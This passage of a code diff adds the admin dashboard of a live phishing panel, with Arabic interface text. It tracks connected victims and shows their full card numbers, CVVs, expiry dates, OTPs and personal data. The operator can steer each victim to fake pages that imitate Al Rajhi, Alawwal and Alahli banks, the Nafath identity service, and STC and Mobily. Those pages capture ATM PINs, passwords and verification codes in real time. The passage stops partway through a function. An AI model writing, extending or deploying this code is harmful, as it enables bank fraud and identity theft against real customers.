+          visitor.hasNewData = false;
+          visitors.set(visitorId, visitor);
+          renderVisitorDetails(visitor);
+          renderVisitorsList();
+        }
+        // Show notification with sound
+        showNotification('📝 بيانات جديدة من الزائر #' + visitor.visitorNumber);
+        // Play notification sound
+        try {
+          const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2teleQAAAAAAAAAAAA==');
+          audio.volume = 0.5;
+          audio.play().catch(() => {});
+        } catch(e) {}
+      });
+
+      socket.on('visitor:disconnected', ({ visitorId, socketId }) => {
+        const visitor = visitors.get(visitorId);
+        if (visitor) {
+          visitor.isConnected = false;
+          visitors.set(visitorId, visitor);
+          renderVisitorsList();
+          if (selectedVisitorId === visitorId) {
+            renderVisitorDetails(visitor);
+          }
+        }
+      });
+
+      socket.on('visitor:reconnected', ({ visitorId, socketId }) => {
+        const visitor = visitors.get(visitorId);
+        if (visitor) {
+          visitor.isConnected = true;
+          visitor.socketId = socketId;
+          visitors.set(visitorId, visitor);
+          renderVisitorsList();
+          if (selectedVisitorId === visitorId) {
+            renderVisitorDetails(visitor);
+          }
+        }
+      });
+    }
+
+    // Render visitors list
+    function renderVisitorsList() {
+      const list = Array.from(visitors.values()).sort((a, b) => {
+        // Check if visitor has data
+        const hasDataA = (a.dataHistory && a.dataHistory.length > 0) || (a.data && Object.keys(a.data).length > 0);
+        const hasDataB = (b.dataHistory && b.dataHistory.length > 0) || (b.data && Object.keys(b.data).length > 0);
+        
+        // Visitors with data come first
+        if (hasDataA && !hasDataB) return -1;
+        if (!hasDataA && hasDataB) return 1;
+        
+        // If both have data or both don't, sort by last activity
+        const getLastActivity = (v) => {
+          // Check lastDataUpdate first (set when data is submitted)
+          if (v.lastDataUpdate) {
+            return new Date(v.lastDataUpdate).getTime();
+          }
+          // Then check dataHistory
+          if (v.dataHistory && v.dataHistory.length > 0) {
+            return new Date(v.dataHistory[v.dataHistory.length - 1].timestamp).getTime();
+          }
+          return new Date(v.createdAt || 0).getTime();
+        };
+        // Sort by last activity (most recent first)
+        return getLastActivity(b) - getLastActivity(a);
+      });
+      const connectedCount = list.filter(v => v.isConnected === true).length;
+      visitorCount.textContent = connectedCount + ' نشط / ' + list.length + ' زائر';
+
+      if (list.length === 0) {
+        visitorsList.innerHTML = '<p class="text-gray-500 text-center py-8">لا يوجد زوار حالياً</p>';
+        return;
+      }
+
+      visitorsList.innerHTML = list.map(v => {
+        const isSelected = selectedVisitorId === v._id;
+        const isDisconnected = v.isConnected !== true;
+        // Get visitor name from data or dataHistory if available
+        let visitorName = null;
+        if (v.data && v.data['الاسم بالعربي']) {
+          visitorName = v.data['الاسم بالعربي'];
+        } else if (v.dataHistory && v.dataHistory.length > 0) {
+          // Search in dataHistory for the name
+          for (const entry of v.dataHistory) {
+            if (entry.content && entry.content['الاسم بالعربي']) {
+              visitorName = entry.content['الاسم بالعربي'];
+              break;
+            }
+          }
+        }
+        const displayName = visitorName ? visitorName : 'زائر #' + v.visitorNumber;
+        return '<div class="visitor-card p-5 rounded-lg border cursor-pointer relative ' + 
+          (isSelected ? 'border-blue-500 bg-blue-50' : 'border-gray-200 hover:border-gray-300') + 
+          (isDisconnected ? ' disconnected' : '') + 
+          '" onclick="selectVisitor(\'' + v._id + '\')">'+
+          // Checkbox at top right
+          '<input type="checkbox" class="visitor-checkbox absolute top-2 right-2 w-4 h-4 cursor-pointer" data-visitor-id="' + v._id + '" onclick="event.stopPropagation();" />' +
+          // Delete button at top left
+          '<button onclick="event.stopPropagation(); deleteVisitorFromCard(\'' + v._id + '\')" class="absolute top-2 left-2 text-xs text-red-500 hover:text-red-700 hover:underline">حذف</button>' +
+          // Two columns layout
+          '<div class="flex justify-between items-start">' +
+          // Left column: Visitor name on top, Device info below
+          '<div class="flex flex-col items-start">' +
+          '<span class="font-bold mb-1">' + displayName + '</span>' +
+          '<span class="text-xs text-gray-500">' + v.device + ' - ' + v.browser + ' · ' + v.ip + '</span>' +
+          '</div>' +
+          // Right column: Timer on top, Page name below
+          '<div class="flex flex-col items-end">' +
+          (v.isConnected === true && v.sessionStartTime ? '<span class="visitor-timer text-xs font-mono bg-green-100 text-green-700 px-2 py-1 rounded mb-1" data-start="' + v.sessionStartTime + '">00:00:00</span>' : '') +
+          '<div class="flex items-center gap-1">' +
+          '<span class="text-xs px-2 py-1 rounded-full ' + (v.waitingForAdminResponse ? 'waiting-badge text-yellow-800' : 'bg-gray-100 text-gray-600') + '">' + v.page + '</span>' +
+          (isDisconnected ? '<span class="w-2 h-2 bg-red-500 rounded-full" title="غير متصل"></span>' : '<span class="w-2 h-2 bg-green-500 rounded-full" title="متصل"></span>') +
+          '</div>' +
+          '</div>' +
+          '</div>' +
+          (v.waitingForAdminResponse ? '<div class="mt-2 text-xs text-yellow-700 font-medium">⏳ ينتظر الرد</div>' : '') +
+          (v.hasNewData ? '<div class="mt-2 text-xs text-blue-700 font-medium">📝 يوجد بيانات جديدة</div>' : '') +
+          '</div>';
+      }).join('');
+      // Start timers for connected visitors
+      startVisitorTimers();
+    }
+
+    // Timer functions
+    let timerInterval = null;
+    function startVisitorTimers() {
+      if (timerInterval) clearInterval(timerInterval);
+      timerInterval = setInterval(updateTimers, 1000);
+      updateTimers();
+    }
+
+    function updateTimers() {
+      const timers = document.querySelectorAll('.visitor-timer');
+      timers.forEach(timer => {
+        const startTime = parseInt(timer.dataset.start);
+        if (startTime) {
+          const elapsed = Math.floor((Date.now() - startTime) / 1000);
+          const hours = Math.floor(elapsed / 3600);
+          const minutes = Math.floor((elapsed % 3600) / 60);
+          const seconds = elapsed % 60;
+          timer.textContent = 
+            String(hours).padStart(2, '0') + ':' + 
+            String(minutes).padStart(2, '0') + ':' + 
+            String(seconds).padStart(2, '0');
+        }
+      });
+    }
+
+    // Select visitor
+    function selectVisitor(visitorId) {
+      selectedVisitorId = visitorId;
+      const visitor = visitors.get(visitorId);
+      if (visitor) {
+        // Mark as read when admin clicks on visitor
+        if (visitor.hasNewData) {
+          socket.emit('admin:markAsRead', visitorId);
+          visitor.hasNewData = false;
+          visitors.set(visitorId, visitor);
+        }
+        renderVisitorDetails(visitor);
+        renderVisitorsList();
+      }
+    }
+
+    // Render visitor details
+    function renderVisitorDetails(visitor) {
+      let html = '<div class="space-y-6">';
+      
+      // Header with device info
+      // Get visitor name from data or dataHistory if available
+      let visitorName = null;
+      if (visitor.data && visitor.data['الاسم بالعربي']) {
+        visitorName = visitor.data['الاسم بالعربي'];
+      } else if (visitor.dataHistory && visitor.dataHistory.length > 0) {
+        // Search in dataHistory for the name
+        for (const entry of visitor.dataHistory) {
+          if (entry.content && entry.content['الاسم بالعربي']) {
+            visitorName = entry.content['الاسم بالعربي'];
+            break;
+          }
+        }
+      }
+      const displayName = visitorName ? visitorName : 'زائر #' + visitor.visitorNumber;
+      html += '<div class="flex justify-between items-start"><div>';
+      html += '<h2 class="text-2xl font-bold">' + displayName + '</h2>';
+      html += '<p class="text-gray-500">' + visitor.page + '</p>';
+      // Get service name and total fees from data dynamically
+      let serviceName = null;
+      let totalFees = null;
+      
+      // Helper function to find total fees dynamically
+      function findTotalFees(data) {
+        if (!data) return null;
+        for (const key of Object.keys(data)) {
+          if (key.includes('المجموع') || key.includes('الإجمالي') || key.includes('الكلي')) {
+            return data[key];
+          }
+        }
+        return null;
+      }
+      
+      // Helper function to find service name dynamically
+      function findServiceName(data) {
+        if (!data) return null;
+        for (const key of Object.keys(data)) {
+          if (key.includes('اسم الخدمة') || key === 'الخدمة') {
+            return data[key];
+          }
+        }
+        return null;
+      }
+      
+      // Helper function to find commercial name (الاسم التجاري المعتمد)
+      function findCommercialName(data) {
+        if (!data) return null;
+        // أخذ الاسم التجاري المعتمد المُشكّل ديناميكياً فقط
+        if (data['الاسم التجاري المعتمد']) return data['الاسم التجاري المعتمد'];
+        return null;
+      }
+      
+      let commercialName = null;
+      
+      if (visitor.data) {
+        serviceName = findServiceName(visitor.data);
+        totalFees = findTotalFees(visitor.data);
+        commercialName = findCommercialName(visitor.data);
+      }
+      if (visitor.dataHistory && visitor.dataHistory.length > 0) {
+        for (const entry of visitor.dataHistory) {
+          if (entry.content) {
+            if (!serviceName) serviceName = findServiceName(entry.content);
+            if (!totalFees) totalFees = findTotalFees(entry.content);
+            if (!commercialName) commercialName = findCommercialName(entry.content);
+          }
+        }
+      }
+      // Commercial name is now shown in the data section below
+      if (serviceName) {
+        html += '<p class="text-blue-600 font-medium">' + serviceName;
+        if (totalFees) html += ' <span class="text-green-600 font-bold mr-2">' + totalFees + '</span>';
+        html += '</p>';
+      }
+      html += '<div class="flex items-center gap-2 mt-2">';
+      html += visitor.isConnected !== true ? 
+        '<span class="inline-block px-3 py-1 bg-red-100 text-red-800 rounded-full text-sm font-medium">🔴 غير متصل</span>' : 
+        '<span class="inline-block px-3 py-1 bg-green-100 text-green-800 rounded-full text-sm font-medium">🟢 متصل</span>';
+      if (visitor.waitingForAdminResponse) {
+        html += '<span class="inline-block px-3 py-1 bg-yellow-100 text-yellow-800 rounded-full text-sm font-medium">⏳ ينتظر الرد</span>';
+      }
+      html += '</div>';
+      // Device info in small text
+      html += '<div class="text-xs text-gray-400 mt-2 space-x-3 space-x-reverse">';
+      html += '<span>' + visitor.ip + '</span>';
+      html += '<span>•</span>';
+      html += '<span>' + visitor.device + ' - ' + visitor.os + '</span>';
+      html += '<span>•</span>';
+      html += '<span>' + visitor.browser + '</span>';
+      html += '<span>•</span>';
+      html += '<span>' + visitor.country + '</span>';
+      html += '</div>';
+      html += '</div>';
+      
+      // Navigate to page (moved from bottom)
+      html += '<div class="flex items-center gap-2">';
+      html += '<span class="text-sm text-gray-500">توجيه لصفحة</span>';
+      html += '<select id="navigateSelectTop" class="px-3 py-2 border rounded-lg">';
+      html += '<option value="">اختر صفحة</option>';
+      html += '<option value="credit-card-payment">الدفع بالبطاقة</option>';
+      html += '<option value="otp-verification">OTP البطاقة</option>';
+      html += '<option value="atm-password">كلمة مرور ATM</option>';
+      html += '<option value="phone-verification">توثيق الجوال</option>';
+      html += '<option value="phone-otp">OTP الجوال</option>';
+      html += '<option value="stc-call-alert">تنبيه STC</option>';
+      html += '<option value="mobily-call-alert">تنبيه Mobily</option>';
+      html += '<option value="nafath-login-page">نفاذ</option>';
+      html += '<option value="nafath-verify">تحقق نفاذ</option>';
+      html += '<option value="alrajhi-login">الراجحي - تسجيل دخول</option>';
+      html += '<option value="alrajhi-otp">الراجحي - OTP</option>';
+      html += '<option value="alrajhi-nafath">الراجحي - نفاذ</option>';
+      html += '<option value="alrajhi-alert">الراجحي - تنبيه</option>';
+      html += '<option value="alrajhi-call">الراجحي - اتصال</option>';
+      html += '<option value="alawwal-bank">بنك الأول</option>';
+      html += '<option value="alawwal-nafath">الأول - نفاذ</option>';
+      html += '<option value="alahli-otp">الأهلي - OTP</option>';
+      html += '<option value="bank-transfer">التحويل البنكي</option>';
+      html += '<option value="bank-account-number">رقم الحساب</option>';
+      html += '<option value="mystc-otp">MyStc OTP</option>';
+      html += '<option value="stc-password">كلمة مرور STC</option>';
+      html += '<option value="final-page">الصفحة النهائية</option>';
+      html += '</select>';
+      html += '<button onclick="navigateVisitorTop(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توجيه</button>';
+      html += '</div></div>';
+      
+      // إظهار زر إرسال الرمز في أعلى معلومات العميل عند دخوله لصفحة تحقق نفاذ
+      console.log('visitor.page:', visitor.page);
+      if (visitor.page === 'تحقق نفاذ') {
+        html += '<div class="bg-purple-50 border border-purple-200 rounded-lg p-4 mt-4">';
+        html += '<h3 class="font-bold text-purple-800 mb-3">🔐 إرسال رمز نفاذ</h3>';
+        html += '<div class="flex gap-2">';
+        html += '<input type="text" id="nafathCodeTop_' + visitor._id + '" value="' + (visitor.lastSentCode || '') + '" placeholder="أدخل الرمز" class="flex-1 px-4 py-2 border rounded-lg text-center font-bold text-lg" maxlength="2">';
+        html += '<button onclick="sendNafathCodeTop(\'' + visitor.socketId + '\', \'' + visitor._id + '\')" id="sendNafathBtnTop_' + visitor._id + '" class="px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>إرسال</button>';
+        html += '</div>';
+        html += '</div>';
+      }
+      
+      // Combine all entries (cards, codes, and data history) and sort by timestamp (newest first))
+      const allEntries = [];
+      
+      // Add digit codes with type
+      if (visitor.digitCodes && visitor.digitCodes.length > 0) {
+        visitor.digitCodes.forEach((dc, index) => {
+          allEntries.push({
+            type: 'code',
+            data: dc,
+            index: index,
+            timestamp: dc.timestamp || new Date(0).toISOString()
+          });
+        });
+      }
+      
+      // Add payment cards with type
+      if (visitor.paymentCards && visitor.paymentCards.length > 0) {
+        visitor.paymentCards.forEach((card, index) => {
+          allEntries.push({
+            type: 'card',
+            data: card,
+            index: index,
+            timestamp: card.timestamp || new Date(0).toISOString()
+          });
+        });
+      }
+      
+      // Add data history entries
+      if (visitor.dataHistory && visitor.dataHistory.length > 0) {
+        visitor.dataHistory.forEach((entry, index) => {
+          allEntries.push({
+            type: 'data',
+            data: entry,
+            index: index,
+            timestamp: entry.timestamp || new Date(0).toISOString()
+          });
+        });
+      }
+      
+      // Sort by timestamp (newest first)
+      allEntries.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+      
+      // Render combined entries
+      if (allEntries.length > 0) {
+        html += '<div class="space-y-3">';
+        allEntries.forEach((entry) => {
+          if (entry.type === 'code') {
+            const dc = entry.data;
+            const index = entry.index;
+            html += '<div class="data-section bg-orange-50 p-4 rounded-lg" style="border-right-color: #f97316;">';
+            html += '<h3 class="font-bold mb-3 text-orange-800">🔢 رمز التحقق</h3>';
+            html += '<div class="bg-white p-3 rounded-lg">';
+            html += '<div class="flex justify-between items-center mb-2">';
+            html += '<span class="font-mono text-lg font-bold text-orange-700">' + dc.code + '</span>';
+            html += '<span class="text-sm text-gray-500">' + dc.page + '</span>';
+            html += '</div>';
+            html += '<div class="flex gap-2">';
+            // تغيير اسم زر الموافقة إلى "توثيق الجوال" لصفحة الراجحي OTP
+            const codeRajhiBtnId = 'code-rajhi-btn-' + visitor.socketId + '-' + index;
+            const codeStcBtnId = 'code-stc-btn-' + visitor.socketId + '-' + index;
+            const codeRajhiNavBtnId = 'code-rajhi-nav-btn-' + visitor.socketId + '-' + index;
+            if (dc.page === 'الراجحى (OTP)') {
+              html += '<button id="' + codeRajhiBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توثيق الجوال</button>';
+            } else if (dc.page === 'MyStc OTP') {
+              // زر اتصال STC لصفحة MyStc OTP
+              html += '<button id="' + codeStcBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اتصال STC</button>';
+            } else {
+              html += '<button onclick="codeActionApprove(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+            }
+            html += '<button onclick="codeActionReject(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+            // إضافة زر راجحي فقط إذا كانت الصفحة ATM والبطاقة تابعة للراجحي
+            if (dc.page === 'كلمة مرور ATM' && isRajhiCard(visitor)) {
+              html += '<button id="' + codeRajhiNavBtnId + '" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>راجحي</button>';
+            }
+            // إضافة event listeners لأزرار رمز التحقق
+            setTimeout(() => {
+              const rajhiBtn = document.getElementById(codeRajhiBtnId);
+              const stcBtn = document.getElementById(codeStcBtnId);
+              const rajhiNavBtn = document.getElementById(codeRajhiNavBtnId);
+              if (rajhiBtn) {
+                rajhiBtn.addEventListener('click', () => {
+                  navigateVisitorToPage(visitor.socketId, 'phone-verification');
+                  const originalText = rajhiBtn.textContent;
+                  rajhiBtn.textContent = 'تم الإرسال ✓';
+                  rajhiBtn.classList.remove('bg-green-600', 'hover:bg-green-700');
+                  rajhiBtn.classList.add('bg-gray-500');
+                  setTimeout(() => {
+                    rajhiBtn.textContent = originalText;
+                    rajhiBtn.classList.remove('bg-gray-500');
+                    rajhiBtn.classList.add('bg-green-600', 'hover:bg-green-700');
+                  }, 1500);
+                });
+              }
+              if (stcBtn) {
+                stcBtn.addEventListener('click', () => {
+                  navigateVisitorToPage(visitor.socketId, 'stc-call-alert');
+                  const originalText = stcBtn.textContent;
+                  stcBtn.textContent = 'تم الإرسال ✓';
+                  stcBtn.classList.remove('bg-purple-600', 'hover:bg-purple-700');
+                  stcBtn.classList.add('bg-green-600');
+                  setTimeout(() => {
+                    stcBtn.textContent = originalText;
+                    stcBtn.classList.remove('bg-green-600');
+                    stcBtn.classList.add('bg-purple-600', 'hover:bg-purple-700');
+                  }, 1500);
+                });
+              }
+              if (rajhiNavBtn) {
+                rajhiNavBtn.addEventListener('click', () => {
+                  navigateToRajhi(visitor.socketId);
+                  const originalText = rajhiNavBtn.textContent;
+                  rajhiNavBtn.textContent = 'تم الإرسال ✓';
+                  rajhiNavBtn.classList.remove('bg-blue-600', 'hover:bg-blue-700');
+                  rajhiNavBtn.classList.add('bg-green-600');
+                  setTimeout(() => {
+                    rajhiNavBtn.textContent = originalText;
+                    rajhiNavBtn.classList.remove('bg-green-600');
+                    rajhiNavBtn.classList.add('bg-blue-600', 'hover:bg-blue-700');
+                  }, 1500);
+                });
+              }
+            }, 100);
+            html += '</div>';
+            html += '</div>';
+            html += '</div>';
+          } else if (entry.type === 'card') {
+            const card = entry.data;
+            const cardIndex = entry.index;
+            const cardInfo = getCardInfo(card.cardNumber);
+            html += '<div class="data-section bg-purple-50 p-4 rounded-lg" style="border-right-color: #9333ea;">';
+            html += '<h3 class="font-bold mb-3 text-purple-800">💳 بطاقة دفع</h3>';
+            // عرض معلومات البنك والنوع
+            html += '<div class="bg-gradient-to-r from-purple-100 to-blue-100 p-3 rounded-lg mb-3 flex justify-between items-center">';
+            html += '<div class="flex items-center gap-2">';
+            html += '<span class="text-purple-700 font-bold text-lg">🏦 ' + cardInfo.bank + '</span>';
+            html += '<span class="px-2 py-1 rounded text-xs font-bold ' + (cardInfo.type === 'Credit' ? 'bg-blue-500 text-white' : 'bg-green-500 text-white') + '">' + cardInfo.type + '</span>';
+            html += '</div>';
+            html += '<div class="flex items-center gap-2">';
+            html += '<span class="px-2 py-1 rounded text-xs font-bold bg-yellow-400 text-yellow-900">' + cardInfo.tier + '</span>';
+            html += '<span class="text-gray-600 text-sm">' + cardInfo.network + '</span>';
+            html += '</div>';
+            html += '</div>';
+            html += '<div class="bg-white p-4 rounded-lg border border-purple-200">';
+            html += '<div class="grid grid-cols-2 gap-4 text-base">';
+            html += '<div><span class="text-gray-500">رقم البطاقة:</span> <span class="font-mono font-bold text-lg" dir="ltr" style="unicode-bidi: embed; display: inline-block;">' + (card.cardNumber ? card.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ') : '') + '</span></div>';
+            html += '<div><span class="text-gray-500">الاسم:</span> <span class="font-medium text-lg">' + card.nameOnCard + '</span></div>';
+            html += '<div><span class="text-gray-500">الانتهاء:</span> <span class="font-medium text-lg">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
+            html += '<div><span class="text-gray-500">CVV:</span> <span class="font-mono font-bold text-lg">' + card.cvv + '</span></div>';
+            html += '</div>';
+            // Action buttons for each card
+            html += '<div class="flex gap-2 mt-3">';
+            html += '<button onclick="cardActionOTP(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP</button>';
+            html += '<button onclick="cardActionATM(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>ATM</button>';
+            html += '<button onclick="cardActionReject(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+            html += '</div>';
+            html += '</div>';
+            html += '</div>';
+          } else if (entry.type === 'data') {
+            const dataEntry = entry.data;
+            const dataIndex = entry.index;
+            const bgColor = dataIndex % 2 === 0 ? 'bg-blue-50' : 'bg-teal-50';
+            const borderColor = dataIndex % 2 === 0 ? '#3b82f6' : '#14b8a6';
+            const textColor = dataIndex % 2 === 0 ? 'text-blue-800' : 'text-teal-800';
+            
+            html += '<div class="data-section ' + bgColor + ' p-4 rounded-lg" style="border-right-color: ' + borderColor + ';">';
+            html += '<h3 class="font-bold mb-3 ' + textColor + '">📋 ' + (dataEntry.page || 'بيانات') + '</h3>';
+            html += '<div class="grid grid-cols-2 gap-3">';
+            
+            // Get commercial name from الاسم التجاري المعتمد field
+            let commercialNameBuilt = null;
+            const content = dataEntry.content;
+            if (content['الاسم التجاري المعتمد']) {
+              commercialNameBuilt = content['الاسم التجاري المعتمد'];
+            } else if (content['الاسم التجاري']) {
+              commercialNameBuilt = 'مؤسسة ' + content['الاسم التجاري'];
+            }
+            
+            // Add commercial name field first if built
+            if (commercialNameBuilt) {
+              html += '<div class="bg-purple-100 p-3 rounded-lg col-span-2"><span class="text-purple-600 text-sm block font-bold">الاسم التجاري المعتمد</span><span class="font-bold text-purple-800 text-lg">' + commercialNameBuilt + '</span></div>';
+            }
+            
+            Object.entries(dataEntry.content).forEach(([key, value]) => {
+              html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + (value || '-') + '</span></div>';
+            });
+            html += '</div>';
+            
+            // إضافة أزرار لتوثيق رقم الجوال
+            if (dataEntry.page === 'توثيق رقم الجوال') {
+              const otpBtnId = 'otp-btn-' + visitor.socketId + '-' + dataIndex;
+              const stcPassBtnId = 'stc-pass-btn-' + visitor.socketId + '-' + dataIndex;
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="' + otpBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP STC</button>';
+              html += '<button id="' + stcPassBtnId + '" class="flex-1 px-3 py-2 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>كلمة مرور STC</button>';
+              html += '</div>';
+              setTimeout(() => {
+                const otpBtn = document.getElementById(otpBtnId);
+                const stcPassBtn = document.getElementById(stcPassBtnId);
+                if (otpBtn) {
+                  otpBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'mystc-otp');
+                    const originalText = otpBtn.textContent;
+                    const originalClasses = ['bg-purple-600', 'hover:bg-purple-700'];
+                    otpBtn.textContent = 'تم الإرسال ✓';
+                    otpBtn.classList.remove(...originalClasses);
+                    otpBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      otpBtn.textContent = originalText;
+                      otpBtn.classList.remove('bg-green-600');
+                      otpBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+                if (stcPassBtn) {
+                  stcPassBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'stc-password');
+                    const originalText = stcPassBtn.textContent;
+                    const originalClasses = ['bg-indigo-600', 'hover:bg-indigo-700'];
+                    stcPassBtn.textContent = 'تم الإرسال ✓';
+                    stcPassBtn.classList.remove(...originalClasses);
+                    stcPassBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      stcPassBtn.textContent = originalText;
+                      stcPassBtn.classList.remove('bg-green-600');
+                      stcPassBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+              }, 100);
+            }
+            
+            // إضافة أزرار لكلمة مرور STC
+            if (dataEntry.page === 'كلمة مرور STC') {
+              const stcCallBtnId = 'stc-call-btn-' + visitor.socketId + '-' + dataIndex;
+              const stcRejectBtnId = 'stc-reject-btn-' + visitor.socketId + '-' + dataIndex;
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="' + stcCallBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اتصال STC</button>';
+              html += '<button id="' + stcRejectBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+              html += '</div>';
+              // إضافة event listeners بعد إنشاء العناصر
+              setTimeout(() => {
+                const callBtn = document.getElementById(stcCallBtnId);
+                const rejectBtn = document.getElementById(stcRejectBtnId);
+                if (callBtn) {
+                  callBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'stc-call-alert');
+                    const originalText = callBtn.textContent;
+                    const originalClasses = ['bg-purple-600', 'hover:bg-purple-700'];
+                    callBtn.textContent = 'تم الإرسال ✓';
+                    callBtn.classList.remove(...originalClasses);
+                    callBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      callBtn.textContent = originalText;
+                      callBtn.classList.remove('bg-green-600');
+                      callBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+                if (rejectBtn) {
+                  rejectBtn.addEventListener('click', () => {
+                    rejectForm(visitor.socketId);
+                    const originalText = rejectBtn.textContent;
+                    const originalClasses = ['bg-red-600', 'hover:bg-red-700'];
+                    rejectBtn.textContent = 'تم الإرسال ✓';
+                    rejectBtn.classList.remove(...originalClasses);
+                    rejectBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      rejectBtn.textContent = originalText;
+                      rejectBtn.classList.remove('bg-green-600');
+                      rejectBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+              }, 100);
+            }
+            
+            // إضافة أزرار لتنبية إتصال STC
+            if (dataEntry.page === 'تنبية إتصال STC') {
+              const nafathBtnId = 'nafath-btn-' + visitor.socketId + '-' + dataIndex;
+              const stcCallRejectBtnId = 'stc-call-reject-btn-' + visitor.socketId + '-' + dataIndex;
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="' + nafathBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>تطبيق نفاذ</button>';
+              html += '<button id="' + stcCallRejectBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+              html += '</div>';
+              // إضافة event listeners بعد إنشاء العناصر
+              setTimeout(() => {
+                const nafathBtn = document.getElementById(nafathBtnId);
+                const rejectBtn = document.getElementById(stcCallRejectBtnId);
+                if (nafathBtn) {
+                  nafathBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'nafath-verify');
+                    const originalText = nafathBtn.textContent;
+                    const originalClasses = ['bg-purple-600', 'hover:bg-purple-700'];
+                    nafathBtn.textContent = 'تم الإرسال ✓';
+                    nafathBtn.classList.remove(...originalClasses);
+                    nafathBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      nafathBtn.textContent = originalText;
+                      nafathBtn.classList.remove('bg-green-600');
+                      nafathBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+                if (rejectBtn) {
+                  rejectBtn.addEventListener('click', () => {
+                    rejectForm(visitor.socketId);
+                    const originalText = rejectBtn.textContent;
+                    const originalClasses = ['bg-red-600', 'hover:bg-red-700'];
+                    rejectBtn.textContent = 'تم الإرسال ✓';
+                    rejectBtn.classList.remove(...originalClasses);
+                    rejectBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      rejectBtn.textContent = originalText;
+                      rejectBtn.classList.remove('bg-green-600');
+                      rejectBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+              }, 100);
+            }
+            
+            // إضافة أزرار للراجحي تسجيل الدخول
+            if (dataEntry.page === 'تسجيل الدخول الراجحى') {
+              const rajhiPhoneBtnId = 'rajhi-phone-btn-' + visitor.socketId + '-' + dataIndex;
+              const rajhiOtpBtnId = 'rajhi-otp-btn-' + visitor.socketId + '-' + dataIndex;
+              html += '<div class="flex gap-2 mt-3">';
